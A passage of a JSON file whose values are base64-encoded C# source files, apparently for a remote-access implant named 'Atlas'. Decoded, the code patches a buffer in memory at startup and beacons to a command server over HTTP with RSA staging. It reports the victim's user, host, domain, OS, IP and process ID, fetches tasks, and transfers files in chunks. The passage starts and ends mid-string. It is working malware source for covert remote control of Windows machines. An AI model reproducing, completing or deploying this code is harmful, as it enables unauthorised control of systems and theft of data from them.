b3VudCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzICs9IEZpbGVTeXN0ZW1FbnRyeS5Ub0pzb24oZW50cnkpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzICs9IEZpbGVTeXN0ZW1FbnRyeS5Ub0pzb24oZW50cnkpICsgJywnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICsrY291bnQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiAiWyIgKyByZXNwb25zZXMgKyAiXSI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgRmlsZVN5c3RlbUVudHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9uYW1lIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgc2l6ZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRpbWVzdGFtcCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIElzRGlyIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBMaXN0Rm9ybWF0ID0gQCJ7eyIiZmlsZV9uYW1lIiI6ICIiezB9IiIsICIic2l6ZSIiOiB7MX0sICIidGltZXN0YW1wIiI6ICIiezJ9IiIsICIiSXNEaXIiIjogezN9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oRmlsZVN5c3RlbUVudHJ5IGxpc3RpbmcpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoDQogICAgICAgICAgICAgICAgICAgIGxpc3RpbmcuTGlzdEZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShsaXN0aW5nLmZpbGVfbmFtZSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUobGlzdGluZy5zaXplLlRvU3RyaW5nKCkpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGxpc3RpbmcudGltZXN0YW1wKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShsaXN0aW5nLklzRGlyKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgRG93bmxvYWRSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHN0YXR1cyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRG93bmxvYWRSZXNwb25zZUZvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiImZpbGVfaWQiIjogIiJ7MX0iIiwgIiJ0YXNrX2lkIiI6ICIiezJ9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIERvd25sb2FkUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IERvd25sb2FkUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgRG93bmxvYWRSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDUpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IERvd25sb2FkUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0U3RhZ2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwdWJfa2V5IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJwdWJfa2V5IiI6IiJ7MX0iIiwiInNlc3Npb25faWQiIjoiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oR2V0U3RhZ2UgZ2V0X3N0YWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBnZXRfc3RhZ2UuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2UuYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2UucHViX2tleSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLnNlc3Npb25faWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBTdGFnZVJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdXVpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25fa2V5IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9pZCB7IGdldDsgc2V0OyB9DQoNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siInV1aWQiIjogIiJ7MH0iIiwgIiJzZXNzaW9uX2tleSIiOiAiInsxfSIiLCAiImFjdGlvbiIiOiAiInsyfSIiLCAiInNlc3Npb25faWQiIjogIiJ7M30iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgQCJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezN9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInszfSIsICIoPydncm91cDMnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDMiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgU3RhZ2VSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gU3RhZ2VSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBKc29uRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNCkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgU3RhZ2VSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzJdLA0KICAgICAgICAgICAgICAgICAgICB1dWlkID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2tleSA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IHBhcnNlTGlzdFszXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQo="
        },
        {
          "Program.cs": "bmFtZXNwYWNlIEF0bGFzDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgTW9kdWxlcy5QYXRjaEJ1ZmZlcigpOw0KICAgICAgICAgICAgVXRpbHMuR2V0U2VydmVycygpOw0KICAgICAgICAgICAgd2hpbGUgKCFIdHRwLkNoZWNrSW4oKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgRHdlbGwgPSBVdGlscy5HZXREd2VsbFRpbWUoKTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZC5TbGVlcChEd2VsbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBVdGlscy5Kb2JMaXN0IEpvYkxpc3QgPSBuZXcgVXRpbHMuSm9iTGlzdA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYl9jb3VudCA9IDAsDQogICAgICAgICAgICAgICAgam9icyA9IHsgfQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLkxvb3AoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgaW50IER3ZWxsID0gVXRpbHMuR2V0RHdlbGxUaW1lKCk7DQogICAgICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQuU2xlZXAoRHdlbGwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"
        },
        {
          "Http_4.0.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KI2lmIERFRkFVTFQNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KI2VuZGlmDQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBNaWNyb3NvZnQuV2luMzI7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBIdHRwDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgQ2hlY2tJbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgICAgICAgICAgQ3J5cHRvLkdlblJzYUtleXMoKTsNCiAgICAgICAgICAgICAgICBVdGlscy5HZXRTdGFnZSBHZXRTdGFnZSA9IG5ldyBVdGlscy5HZXRTdGFnZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInN0YWdpbmdfcnNhIiwNCiAgICAgICAgICAgICAgICAgICAgcHViX2tleSA9IENyeXB0by5HZXRQdWJLZXkoKSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IFV0aWxzLkdldFNlc3Npb25JZCgpDQoNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXNzaW9uSWQgPSBHZXRTdGFnZS5zZXNzaW9uX2lkOw0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0U3RhZ2UoVXRpbHMuR2V0U3RhZ2UuVG9Kc29uKEdldFN0YWdlKSk7DQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQogICAgICAgICAgICAgICAgVXRpbHMuU3RhZ2VSZXNwb25zZSBTdGFnZVJlc3BvbnNlID0gVXRpbHMuU3RhZ2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQpOw0KICAgICAgICAgICAgICAgIENvbmZpZy50ZW1wVVVJRCA9IFN0YWdlUmVzcG9uc2UudXVpZDsNCiAgICAgICAgICAgICAgICBDb25maWcuUHNrID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhDcnlwdG8uUnNhRGVjcnlwdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoU3RhZ2VSZXNwb25zZS5zZXNzaW9uX2tleSkpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW4gQ2hlY2tJbiA9IG5ldyBVdGlscy5DaGVja0luDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiY2hlY2tpbiIsDQogICAgICAgICAgICAgICAgICAgIGlwID0gVXRpbHMuR2V0SVBBZGRyZXNzKCksDQogICAgICAgICAgICAgICAgICAgIG9zID0gUmVnaXN0cnkuR2V0VmFsdWUoQCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iLCAiUHJvZHVjdE5hbWUiLCAiIikuVG9TdHJpbmcoKSArICIgIiArIFJlZ2lzdHJ5LkdldFZhbHVlKEAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIiwgIlJlbGVhc2VJZCIsICIiKSwNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IEVudmlyb25tZW50LlVzZXJOYW1lLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBFbnZpcm9ubWVudC5NYWNoaW5lTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBFbnZpcm9ubWVudC5Vc2VyRG9tYWluTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBwaWQgPSBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBDb25maWcuUGF5bG9hZFVVSUQsDQogICAgICAgICAgICAgICAgICAgIGFyY2hpdGVjdHVyZSA9IFV0aWxzLkdldEFyY2goKQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBGaW5hbFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5QYXlsb2FkVVVJRCArIFV0aWxzLkNoZWNrSW4uVG9Kc29uKENoZWNrSW4pKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIEZpbmFsU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdENoZWNraW4oVXRpbHMuQ2hlY2tJbi5Ub0pzb24oQ2hlY2tJbikpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIG5ld19yZXN1bHQgPSBHZXQoRmluYWxTZXJpYWxpemVkRGF0YSk7DQojaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBsYXN0X3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KG5ld19yZXN1bHQpOw0KI2VuZGlmDQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW5SZXNwb25zZSBDaGVja0luUmVzcG9uc2UgPSBVdGlscy5DaGVja0luUmVzcG9uc2UuRnJvbUpzb24obmV3X3Jlc3VsdCk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgVXRpbHMuQ2hlY2tJblJlc3BvbnNlIENoZWNrSW5SZXNwb25zZSA9IFV0aWxzLkNoZWNrSW5SZXNwb25zZS5Gcm9tSnNvbihsYXN0X3Jlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBDb25maWcuVVVJRCA9IENoZWNrSW5SZXNwb25zZS5pZDsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2tJblJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEdldFRhc2tpbmcoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5Kb2IgSm9iIGluIEpvYkxpc3Quam9icykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IudXBsb2FkKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKEpvYi50b3RhbF9jaHVua3MgIT0gSm9iLmNodW5rX251bSkgJiAoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5jaHVua2luZ19zdGFydGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkVGFza2luZyBVcGxvYWRUYXNraW5nID0gVXRpbHMuVXBsb2FkVGFza2luZy5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5maWxlX2lkID0gVXBsb2FkVGFza2luZy5hc3NlbWJseV9pZDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBVcGxvYWRUYXNraW5nLnJlbW90ZV9wYXRoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgVXBsb2FkID0gbmV3IFV0aWxzLlVwbG9hZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAidXBsb2FkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX3NpemUgPSBDb25maWcuQ2h1bmtTaXplLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZFJlc3BvbnNlIFVwbG9hZFJlc3BvbnNlID0gSHR0cC5HZXRVcGxvYWQoVXBsb2FkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IFVwbG9hZFJlc3BvbnNlLnRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQoVXBsb2FkUmVzcG9uc2UuY2h1bmtfZGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua2luZ19zdGFydGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgQ2h1bmtVcGxvYWQgPSBuZXcgVXRpbHMuVXBsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9ICJ1cGxvYWQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfc2l6ZSA9IENvbmZpZy5DaHVua1NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBIdHRwLkdldFVwbG9hZChDaHVua1VwbG9hZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKFVwbG9hZFJlc3BvbnNlLmNodW5rX2RhdGEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBVdGlscy5HZXRUYXNraW5nIEdldFRhc2tpbmcgPSBuZXcgVXRpbHMuR2V0VGFza2luZw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gImdldF90YXNraW5nIiwNCiAgICAgICAgICAgICAgICAgICAgdGFza2luZ19zaXplID0gMQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCArIFV0aWxzLkdldFRhc2tpbmcuVG9Kc29uKEdldFRhc2tpbmcpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuR2V0VGFza2luZy5Ub0pzb24oR2V0VGFza2luZykpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEd